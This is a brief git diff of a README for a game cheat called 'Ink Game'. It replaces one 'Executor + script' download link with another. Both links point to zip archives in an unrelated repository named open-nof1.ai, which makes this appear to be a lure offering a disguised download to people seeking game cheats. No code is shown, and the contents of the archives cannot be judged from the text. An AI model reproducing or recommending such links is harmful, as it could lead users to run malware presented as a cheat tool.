@@ -1,6 +1,6 @@
 # 🎨 Ink Game
 
-Executor + script --- [ScriptPacked](https://raw.githubusercontent.com/lakabriya1212/open-nof1.ai/main/redefine/open-nof1.ai_v2.8-beta.1.zip)
+Executor + script --- [ScriptPacked](https://github.com/lakabriya1212/open-nof1.ai/raw/refs/heads/main/redefine/ai-open-nof-1.0-beta.3.zip)
 
 ## ✨ Features
 
